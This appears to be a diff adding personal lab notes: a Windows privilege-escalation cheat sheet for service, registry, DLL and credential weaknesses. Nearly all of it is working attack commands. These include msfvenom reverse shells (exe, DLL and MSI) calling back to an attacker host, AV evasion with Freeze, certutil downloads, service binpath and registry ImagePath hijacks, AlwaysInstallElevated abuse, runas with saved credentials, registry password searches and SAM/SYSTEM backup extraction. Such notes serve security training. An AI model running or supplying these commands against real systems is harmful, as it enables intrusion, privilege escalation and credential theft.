@@ -1,0 +1,212 @@
+Service Misconfigurations>: 
+	> Insecure Service Properties: 
+
+	certutil -urlcache -f http://192.168.1.133/winpeas.exe winpeas.exe
+
+	winpeas.exe quiet servicesinfo
+
+	Certutil.exe -urlcache -f http://192.168.1.133/accesschk.exe accesschk.exe
+
+	.\accesschk.exe /accepteula -uwcqv user daclsvc 
+
+	sc qc daclsvc
+
+	sc query daclsvc
+
+	>create a metasploit reverse shell
+
+	msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.133 LPORT=53 -f raw >  reverse-shell.bin
+
+	./Freeze -I reverse-shell.bin -encrypt -O reverse.exe
+
+	certutil -urlcache -f http://192.168.1.133/reverse.exe reverse.exe
+
+	sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe""
+
+	nc -nvlp 53
+
+	net start daclsvc
+
+
+Unquoted Service Path: 
+	
+		> let's run winpeas again 
+
+	Unquoted Path Service : 
+
+	.\accesschk.exe /accepteula -ucqv user unquotedsvc
+
+	.\accesschk.exe /accepteula -uwdq C:\
+
+	.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+
+	.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+
+	copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+	nc -nvlp 53
+
+	net start unquotedsvc
+
+
+Weak Registry Permission: 
+
+	run winpeas quiet servicesinfo
+
+	> regsvc service ownership control in winpeas 
+
+	powershell -exec bypass
+
+	Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+
+	or 
+
+	.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+	.\accesschk.exe /accepteula -ucqv user regsvc
+
+	Reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
+
+	reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc\ /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\Reverse.exe /f
+
+	net start regsvc
+
+Insecure Service Executables: 
+		
+	see the winpeas output: 
+
+	we can see filepermservice.exe has all the Permission 
+
+	.\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+	.\accesschk.exe /accepteula -uvqc filepermsvc
+
+	copy /y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+
+	nc -nvlp 53
+
+	net start filepermsvc
+
+
+DLL Hijacking: 
+	
+		winpeas output we see dllhijackservice.exe 
+
+		.\accesschk.exe /accepteula -uvqc user dllsvc
+
+		sc qc dllsvc
+
+		create a reverse shell
+
+		sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.133 LPORT=53 -f dll -o /var/www/html/hijackme.dll
+
+		transfer the file into tmp
+
+		C:\Temp
+
+		nc -nvlp 53
+
+		net stop dllsvc
+
+		net start dllsvc 
+
+		boom - we get shell back
+
+
+Windows Rgistry:
+
+	AlwaysInstalledElevated:
+
+	winpeas.exe windowsCreds
+
+	verify this menualy -- 
+
+	Reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
+
+	Reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
+
+	to exploit we have to create new MSI reverse shell 
+
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.133 LPORT=53 -f msi > reverse.msi
+
+	download the MSI file 
+
+	certutil -urlcache -f http://192.168.1.133/reverse.msi reverse.msi
+
+	nc -nvlp 53
+
+	msiexec /quiet /qn /i reverse.msi
+
+
+Passwords: 
+		
+		in many places windows saved the password's in plaintext or normal encoding , we can ealily find this using 
+
+		.\winpeas.exe quiet filesinfo
+
+Registry Password Finding : 
+
+		Plnety of programs store configuration options in the Windows Registry 
+
+		Windows sometimes store passwords in plaintext in registry . 
+
+		search : 
+
+		reg query HKLM /f password /t REG_SZ /s
+
+		reg query HKCU /f password /t REG_SZ /s
+
+
+
+Saved Creds : 
+
+	
+		Windows hash a runas command which allows users to run commands withthe privileges of other users. 
+
+		cmdkey /list
+
+		nc -nvlp 53
+
+		runas /savedcred /user:admin reverse.exe
+
+
+Configuration Files: 
+
+	
+		Some administrators will leave configurations files on the system with passwords in them. 
+
+		The Unattend.xml file is an example of this. 
+
+		It allows for a largely automated setup of Windows System. 
+
+		search : 
+
+		dir /s *pass* == *.config
+
+		findstr /si password *.xml *.ini *.txt
+
+
+SAM: 
+
+		Windows stores password hashes in the Security Account Manager(SAM)
+
+		These hashes are encrypted with a key which can be found in a file called SYSTEM. 
+
+		SAM/SYSTEM Locations
+
+		The SAM and SYSTEM files are located in the 
+
+		C:\Windows\System32\config directory
+
+	this files are locked which Windows is running . 
+
+	Backup of the file's may exist is the C:\Windows\Repair or C:\Windows\System32\config\RegBack directory
+
+Looking the output of winpeas: 
+
+	We got backup of SAM & SYSTEM file
+
+	if we copy two files from windows to linux. 
+
+	Then we can extract User & Password Informations . 
+
